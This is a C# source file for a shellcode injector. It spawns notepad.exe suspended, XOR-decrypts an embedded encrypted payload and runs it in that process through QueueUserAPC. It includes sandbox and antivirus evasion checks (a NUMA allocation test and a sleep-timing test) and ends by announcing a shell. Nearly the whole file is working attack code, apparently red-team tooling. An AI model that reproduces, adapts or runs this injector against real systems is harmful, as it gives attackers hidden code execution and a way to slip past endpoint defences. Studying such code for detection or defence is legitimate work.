/*QUEUE USER APC PROCESS INJECTION
description: |
	Injects shellcode into a newly spawned remote process using user-mode asynchronous procedure call (APC). 
	Thread execution via ResumeThread.
key win32 API calls:
  - kernel32.dll:
    1: 'CreateProcess'
    2: 'VirtualAllocEx'
    3: 'WriteProcessMemory'
    4: 'OpenThread'
    5: 'VirtualProtectEx'
    6: 'QueueUserAPC'
	7: 'ResumeThread'
*/

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace QUserAPCProcessInjection
{
    class Program
    {
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct STARTUPINFO
		{
			public uint cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public uint dwX;
			public uint dwY;
			public uint dwXSize;
			public uint dwYSize;
			public uint dwXCountChars;
			public uint dwYCountChars;
			public uint dwFillAttribute;
			public uint dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}
		
		[StructLayout(LayoutKind.Sequential)]
		public struct PROCESS_INFORMATION
		{
			// A handle to the newly created process. The handle is used to specify the process in all functions that perform operations on the process object.
			public IntPtr hProcess;
			// A handle to the primary thread of the newly created process. The handle is used to specify the thread in all functions that perform operations on the thread object.
			public IntPtr hThread;
			public int dwProcessId;
			public int dwThreadId;
		}
		
		[Flags]
		public enum ThreadAccess : int
		{
			TERMINATE = (0x0001),
			SUSPEND_RESUME = (0x0002),
			GET_CONTEXT = (0x0008),
			SET_CONTEXT = (0x0010),
			SET_INFORMATION = (0x0020),
			QUERY_INFORMATION = (0x0040),
			SET_THREAD_TOKEN = (0x0080),
			IMPERSONATE = (0x0100),
			DIRECT_IMPERSONATION = (0x0200),
			THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
			THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
		}
		
		[Flags]
		public enum ProcessCreationFlags : uint
		{
			ZERO_FLAG = 0x00000000,
			CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
			CREATE_DEFAULT_ERROR_MODE = 0x04000000,
			CREATE_NEW_CONSOLE = 0x00000010,
			CREATE_NEW_PROCESS_GROUP = 0x00000200,
			CREATE_NO_WINDOW = 0x08000000,
			CREATE_PROTECTED_PROCESS = 0x00040000,
			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
			CREATE_SEPARATE_WOW_VDM = 0x00001000,
			CREATE_SHARED_WOW_VDM = 0x00001000,
			CREATE_SUSPENDED = 0x00000004,
			CREATE_UNICODE_ENVIRONMENT = 0x00000400,
			DEBUG_ONLY_THIS_PROCESS = 0x00000002,
			DEBUG_PROCESS = 0x00000001,
			DETACHED_PROCESS = 0x00000008,
			EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
			INHERIT_PARENT_AFFINITY = 0x00010000
		}

		
		//https://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html
		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		public static extern bool CreateProcess(
				   string lpApplicationName,
				   string lpCommandLine,
				   IntPtr lpProcessAttributes,
				   IntPtr lpThreadAttributes,
				   bool bInheritHandles,
				   ProcessCreationFlags dwCreationFlags,
				   IntPtr lpEnvironment,
				   string lpCurrentDirectory,
				   ref STARTUPINFO lpStartupInfo, 
				   out PROCESS_INFORMATION lpProcessInformation);
		
		//https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread
		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr OpenThread(
					ThreadAccess dwDesiredAccess, 		
					bool bInheritHandle,
					int dwThreadId);
		
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpshellcodefer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
				
		//https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc
		[DllImport("kernel32.dll")]
		private static extern UInt32 QueueUserAPC(
					IntPtr pfnAPC,
					IntPtr hThread,
					IntPtr dwData);
					
		[DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);
		
		[DllImport("kernel32.dll")]
		static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
		
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentThread();

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		
		[DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);
		
		static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
                return;
            }

			Console.WriteLine("[+] Delay of three seconds for scan bypass check");
			
			DateTime time1 = DateTime.Now;
            Sleep(3000);
            double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
            if (time2 < 2.5)
            {
                Console.WriteLine("(Sleep) [-] Failed check");
				return;
            }
			
			static byte[] xor(byte[] cipher, byte[] key)
			{
			byte[] xored = new byte[cipher.Length];

			for (int i = 0; i < cipher.Length; i++)
			{
				xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
			}

			return xored;
			}
			
			Console.WriteLine("[+] Decrypt Shellcode");
			
			string key = "MROBOTX";
			System.Threading.Thread.Sleep(3000);
			// This shellcode byte is the encrypted output from encryptor.exe
            byte[] xorshellcode = new byte[511] { 0xb1, 0x1a, 0xcc, 0xa6, 0xbf, 0xbc, 0x94, 0x4d, 0x52, 0x4f, 0x03, 0x1e, 0x15, 0x08, 0x1f, 0x03, 0x07, 0x73, 0x9d, 0x31, 0x10, 0xc6, 0x00, 0x2f, 0x0a, 0xc4, 0x06, 0x40, 0x1b, 0x1a, 0xc4, 0x10, 0x6f, 0x1c, 0x57, 0xfa, 0x18, 0x05, 0x0a, 0xc4, 0x26, 0x08, 0x00, 0x63, 0x86, 0x0a, 0x7e, 0x94, 0xf4, 0x71, 0x33, 0x33, 0x40, 0x63, 0x74, 0x19, 0x8c, 0x9b, 0x42, 0x03, 0x4e, 0x95, 0xba, 0xa0, 0x00, 0x0e, 0x13, 0x07, 0xdf, 0x0a, 0x6d, 0xd9, 0x0d, 0x7e, 0x07, 0x55, 0x88, 0x2b, 0xd3, 0x37, 0x5a, 0x44, 0x56, 0x57, 0xc8, 0x20, 0x4f, 0x42, 0x4f, 0xdf, 0xd8, 0xc5, 0x52, 0x4f, 0x42, 0x07, 0xd1, 0x98, 0x39, 0x35, 0x07, 0x43, 0x9f, 0x04, 0xd3, 0x05, 0x4a, 0x0b, 0xc9, 0x0f, 0x74, 0x11, 0x4c, 0x82, 0xac, 0x14, 0x02, 0x65, 0x91, 0x05, 0xad, 0x86, 0x03, 0xc4, 0x60, 0xd0, 0x05, 0x53, 0x99, 0x0a, 0x7e, 0x94, 0x19, 0x8c, 0x9b, 0x42, 0xee, 0x0e, 0x55, 0x99, 0x75, 0xb2, 0x3a, 0xb3, 0x03, 0x57, 0x14, 0x69, 0x5a, 0x0a, 0x7b, 0x9e, 0x21, 0x80, 0x15, 0x16, 0xc4, 0x02, 0x6b, 0x1d, 0x59, 0x9d, 0x34, 0x0e, 0xc9, 0x43, 0x1c, 0x1c, 0xc6, 0x12, 0x53, 0x0b, 0x4e, 0x84, 0x19, 0xc6, 0x56, 0xc7, 0x03, 0x17, 0x1c, 0x59, 0x9d, 0x13, 0x17, 0x1c, 0x16, 0x0e, 0x19, 0x15, 0x13, 0x16, 0x03, 0x15, 0x1c, 0xdb, 0xa1, 0x72, 0x0e, 0x10, 0xb0, 0xb4, 0x00, 0x0c, 0x0b, 0x15, 0x0a, 0xc4, 0x46, 0xb1, 0x06, 0xad, 0xb0, 0xbd, 0x12, 0x1d, 0xe6, 0x3a, 0x21, 0x7d, 0x1d, 0x7c, 0x66, 0x58, 0x4d, 0x13, 0x19, 0x0b, 0xc6, 0xb2, 0x10, 0xcc, 0xbe, 0xef, 0x43, 0x4f, 0x54, 0x11, 0xc4, 0xb7, 0x06, 0xfe, 0x4d, 0x54, 0x7f, 0x42, 0x92, 0xe7, 0x42, 0x6d, 0x15, 0x0c, 0x04, 0xdb, 0xab, 0x0e, 0xc6, 0xa5, 0x19, 0xf7, 0x1e, 0x38, 0x64, 0x48, 0xab, 0x8d, 0x01, 0xdb, 0xa5, 0x2a, 0x4e, 0x55, 0x58, 0x4d, 0x0b, 0x0e, 0xf8, 0x66, 0xd4, 0x33, 0x4d, 0xad, 0x9a, 0x28, 0x45, 0x15, 0x06, 0x1d, 0x02, 0x02, 0x73, 0x86, 0x19, 0x69, 0x8d, 0x1a, 0xb0, 0x82, 0x07, 0xdd, 0x9a, 0x05, 0xad, 0x8f, 0x0a, 0xc6, 0x95, 0x19, 0xf7, 0xb8, 0x40, 0x9d, 0xaf, 0xab, 0x8d, 0x05, 0xdb, 0x88, 0x28, 0x5f, 0x15, 0x00, 0x01, 0xdb, 0xad, 0x0a, 0xc6, 0xad, 0x19, 0xf7, 0xcb, 0xea, 0x36, 0x2e, 0xab, 0x8d, 0xc8, 0x92, 0x3b, 0x48, 0x06, 0xab, 0x96, 0x38, 0xb7, 0xa7, 0xd1, 0x4f, 0x54, 0x58, 0x05, 0xd1, 0xa3, 0x52, 0x07, 0xdd, 0xba, 0x00, 0x63, 0x86, 0x28, 0x4b, 0x15, 0x00, 0x05, 0xdb, 0xb6, 0x03, 0xf5, 0x56, 0x81, 0x85, 0x0d, 0xb0, 0x97, 0xcc, 0xac, 0x58, 0x33, 0x07, 0x07, 0xc1, 0x8b, 0x74, 0x06, 0xc4, 0xa4, 0x25, 0x02, 0x0e, 0x0d, 0x30, 0x4d, 0x42, 0x4f, 0x42, 0x0e, 0x0c, 0x10, 0xc4, 0xa0, 0x07, 0x73, 0x86, 0x15, 0xe2, 0x15, 0xf6, 0x1c, 0xa7, 0xb0, 0x81, 0x10, 0xc4, 0x91, 0x06, 0xcb, 0x88, 0x19, 0x69, 0x84, 0x1b, 0xc6, 0xb2, 0x07, 0xdd, 0x82, 0x05, 0xdb, 0xb6, 0x03, 0xf5, 0x56, 0x81, 0x85, 0x0d, 0xb0, 0x97, 0xcc, 0xac, 0x58, 0x30, 0x7a, 0x17, 0x03, 0x18, 0x0d, 0x30, 0x4d, 0x12, 0x4f, 0x42, 0x0e, 0x0c, 0x32, 0x4d, 0x08, 0x0e, 0xf8, 0x44, 0x7b, 0x57, 0x7d, 0xad, 0x9a, 0x15, 0x16, 0x15, 0xe2, 0x38, 0x3c, 0x02, 0x23, 0xb0, 0x81, 0x11, 0xb2, 0x9c, 0xa6, 0x7e, 0xb0, 0xab, 0xa7, 0x05, 0x53, 0x8c, 0x0a, 0x66, 0x92, 0x10, 0xc8, 0xa4, 0x3a, 0xf6, 0x0e, 0xab, 0xbf, 0x15, 0x38, 0x4f, 0x1b, 0xf4, 0xb4, 0x45, 0x67, 0x58, 0x0e, 0xcb, 0x95, 0xab, 0x8d };

			byte[] shell;
			shell = xor(xorshellcode, Encoding.ASCII.GetBytes(key));
            
			// Store the shellcode as a variable
			var shellcode = shell;
			
			System.Threading.Thread.Sleep(3000);
			
            string processPath = @"C:\Windows\System32\notepad.exe";
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

			Console.WriteLine("[+] Opening notepad.exe in the background");
			// Creates the process suspended. ProcessCreationFlags.CREATE_SUSPENDED = 0x00000004
			CreateProcess(processPath, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
			
			// Sets an integer pointer as a variable reference for the memory space to be allocated for the shellcode
			IntPtr alloc = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
			
			Console.WriteLine("[+] WriteProcessMemory to 0x{0}", new string[] { alloc.ToString("X") });
			// Writes the shellcode into the created memory space
			WriteProcessMemory(pi.hProcess, alloc, shellcode, (uint)shellcode.Length, out UIntPtr bytesWritten);
			
			Console.WriteLine("[+] OpenThread to 0x{0}", new string[] { alloc.ToString("X") });
			//ThreadAccess.SET_CONTEXT = 0x0010
			IntPtr tpointer = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
            uint oldProtect = 0;
			
			Console.WriteLine("[+] VirtualProtectEx on 0x{0}", new string[] { alloc.ToString("X") });
			// Changes the protection rights to the memory space allocated for the shellcode
			VirtualProtectEx(pi.hProcess, alloc, shellcode.Length, 0x20, out oldProtect);
			
			Console.WriteLine("[+] Setting QueueUserAPC to 0x{0}", new string[] { alloc.ToString("X") });
			// Adds a user-mode asynchronous procedure call (APC) object to the APC queue of the specified thread tpointer
			QueueUserAPC(alloc, tpointer, IntPtr.Zero);
			
            Console.WriteLine("[+] Resume thread 0x{0}", new string[] { pi.hThread.ToString("X") });
            // Resume the suspended notepad.exe thread
            ResumeThread(pi.hThread);
			
			Console.WriteLine("[+] Enjoy your shell from notepad");
			//This is for debug. You can comment the below line if you do not need to read all the console messages
			System.Threading.Thread.Sleep(3000);
		}
	}
}
